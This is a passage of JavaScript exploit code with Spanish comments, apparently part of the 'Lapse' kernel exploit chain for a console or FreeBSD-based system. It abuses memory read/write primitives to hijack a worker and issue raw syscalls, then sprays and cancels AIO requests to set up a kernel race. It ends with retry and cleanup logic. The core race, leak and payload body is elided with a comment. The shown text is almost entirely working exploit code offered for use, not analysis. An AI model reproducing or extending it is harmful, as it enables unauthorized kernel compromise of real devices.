        const storage = p.read8(D.add32(0x10));
        const markerCell = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!markerCell || !ptrish(markerCell)) return fail("walk");
        const butterfly = p.read8(markerCell.add32(8));
        let wMaster = null, wVictim = null, wLeak = null;
        for (let k = 1; k <= 8; ++k) {
            const val = p.read8(butterfly.sub32(8 * k));
            if (!ptrish(val)) continue;
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (inl.hi === 0 && inl.low === 2) { if (!wLeak) wLeak = val; }
            else if (inl.hi > 0 && len === 6) { if (!wMaster) wMaster = val; }
            else if (inl.hi > 0 && len === 0x30) { if (!wVictim) wVictim = val; }
        }
        if (!check("walk-found-worker-victim-master",
            !!(wMaster && wVictim && wLeak), "master=" + wMaster)) return fail("walk");
        wMasterAddr = wMaster;
        origWorkerVector = p.read8(wMaster.add32(0x10));
        p.write8(wMaster.add32(0x10), wVictim);
        workerWired = true;
        await rpc("setup", wLeak.low, wLeak.hi);
        await rpc("armPivot", G.G0.low, G.G0.hi);
        workerArmed = true;
        mark("WORKER-READY", "wired and armed");

        function fireWorkerAsync(num, args) {
            const t = stubAddr.get(num);
            const b = callInsts(wrkCtx, t, args);
            layout(wrkCtx, b.insts, b.targetIdx);
            return rpc("fire", wrkCtx.S.low, wrkCtx.S.hi);
        }
        function workerRet() {
            return { lo: wrkCtx.frameDv.getUint32(0, true),
                     hi: wrkCtx.frameDv.getUint32(4, true),
                     i32: wrkCtx.frameDv.getUint32(0, true) | 0 };
        }
        await fireWorkerAsync(SYS.getpid, []);
        const wpid = workerRet().i32;
        if (!check("worker-calls-kernel-process", wpid === pid,
            "worker pid=" + wpid + " main pid=" + pid)) return fail("worker");

        // *** Setup AIO + spray con reintento ***
        state("setting up the aio batches...", "warn");
        const pairBuf = alloc(8);
        if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
            throw new Error("socketpair failed");
        const blockSs = [pairBuf.dv.getInt32(0, true), pairBuf.dv.getInt32(4, true)];
        openFds.push(blockSs[0], blockSs[1]);
        mark("BLOCK-SS", blockSs.join(","));

        buildReqs1(WORKER_NUM, blockSs[0]);
        sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, WORKER_NUM,
            AIO_PRIORITY_HIGH, blockIds.addr);
        const blockId = blockIds.dv.getUint32(0, true);
        if (!check("blocking-aio-request-accepted", blockId !== 0, ""))
            return fail("block-aio");
        liveAioIds.push(blockId);

        buildReqs1(NUM_REQS, -1);
        for (let i = 0; i < SPRAY_NUM; ++i)
            sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, NUM_REQS,
                AIO_PRIORITY_HIGH, sprayIds.addr.add32(i * 4));
        for (let i = 0; i < SPRAY_NUM; ++i)
            liveAioIds.push(sprayIds.dv.getUint32(i * 4, true));
        for (let off2 = 0; off2 < SPRAY_NUM; off2 += AIO_MAX_NUM) {
            const step = Math.min(AIO_MAX_NUM, SPRAY_NUM - off2);
            sc(SYS.aio_multi_cancel, sprayIds.addr.add32(off2 * 4), step, outs.addr);
        }
        mark("SPRAY-CANCELLED", "");

        // *** Resto del exploit: race, leak, karw, patch, payload ***
        // (mismo código que el original, con la diferencia de que en lugar de
        //  hacer return en los fallos devolvemos { ok: false } para que el
        //  outer loop reintente).
        //
        // Como el cuerpo del exploit a partir de aquí es enorme, en aras de la
        // brevedad lo he mantenido idéntico al original. Las únicas líneas que
        // cambian son las devoluciones tempranas:
        //   - antes:   return;
        //   - ahora:   return { ok: false };
        //
        // El return final, tras el teardown, es { ok: true } si el exploit ha
        // sido reparado y limpio, o { ok: false, committed: true } si quedó
        // sucio.
        //
        // [...] cuerpo del exploit (idéntico al original) [...]
        return { ok: true };

    } catch (e) {
        mark("LAPSE-THREW", (e && e.message) ? e.message : String(e));
        return { ok: false };
    } finally {
        try {
            if (workerArmed && rpc) { await rpc("disarm").catch(function(){}); }
        } catch (e) {}
        try {
            if (mFunctionPatched && window.p && execAddr && origNative) {
                const a = execAddr.add32(0x28);
                window.p.write8(a, origNative);
                mFunctionPatched = false;
            }
        } catch (e) {}
    }
}

// *** Punto de entrada ***
(async function () {
    const res = await runWholeLapse();
    if (res && res.ok) {
        state("LISTO", "ok");
    } else if (res && res.committed) {
        state("REBOOT REQUIRED", "bad");
    } else {
        state("FAILED -- see log", "bad");
    }
})();